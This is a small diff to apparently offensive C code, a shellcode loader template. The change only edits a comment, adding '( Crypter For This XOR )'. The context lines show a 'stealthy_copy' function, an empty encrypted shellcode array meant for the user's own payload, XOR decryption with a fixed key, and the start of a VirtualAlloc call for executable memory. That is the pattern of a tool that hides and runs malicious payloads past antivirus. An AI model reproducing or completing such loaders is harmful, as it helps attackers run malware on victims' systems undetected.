@@ -18,7 +18,7 @@ void stealthy_copy(void* dest, const void* src, size_t n) {
 
 int main() {
     srand((unsigned int)time(NULL));
-    unsigned char encrypted_shellcode[] = ""; // Your ShellCode
+    unsigned char encrypted_shellcode[] = ""; // Your ShellCode ( Crypter For This XOR )
     const unsigned char xor_key = 0xAA; // XOR Key
     XORDecrypt(encrypted_shellcode, sizeof(encrypted_shellcode), xor_key);
     LPVOID exec_mem = VirtualAlloc(
